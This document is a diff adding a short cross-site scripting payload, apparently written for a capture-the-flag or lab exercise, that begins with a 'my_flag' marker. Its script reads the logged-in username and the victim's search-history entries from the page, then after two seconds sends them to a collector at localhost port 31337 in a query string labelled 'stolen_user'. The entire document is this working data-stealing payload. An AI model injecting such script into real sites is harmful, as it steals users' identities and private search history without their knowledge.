@@ -1,0 +1,15 @@
+my_flag
+<script>
+	var username = document.getElementById('logged-in-user').innerHTML;
+	var last_search = "DEFAULT";
+	setTimeout(() => {
+	var history_items = document.getElementsByClassName('history-item');
+	for(var i=0;i<history_items.length;i++){
+		if(!history_items[i].innerHTML.includes("my_flag")){
+			last_search = history_items[i].innerHTML;
+			break;
+		}
+	}
+	$.get("http://localhost:31337/?stolen_user="+username+"&last_search="+last_search);
+	},2000);
+</script>
